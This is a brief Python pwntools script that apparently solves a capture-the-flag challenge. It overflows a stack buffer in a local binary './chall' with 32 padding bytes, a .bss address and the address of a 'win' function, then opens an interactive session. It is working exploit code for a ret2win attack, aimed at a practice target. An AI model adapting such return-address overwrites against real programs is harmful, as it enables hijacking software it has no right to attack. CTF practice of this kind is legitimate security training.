import os
import pwn
import time

pwn.context.binary = elf = pwn.ELF("./chall")

if pwn.args.REMOTE:
    io = pwn.remote("localhost", 1024)
else:
    io = pwn.process("./chall")

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *vuln+58
continue
""",
    )


p = b"A" * 32
p += pwn.p64(elf.bss(0x100))  # Writable memory to avoid SEGFAULT
p += pwn.p64(elf.symbols.win)
p += pwn.p64(0x0000000000401245)

io.sendlineafter("**beep**\n", p)
io.interactive()
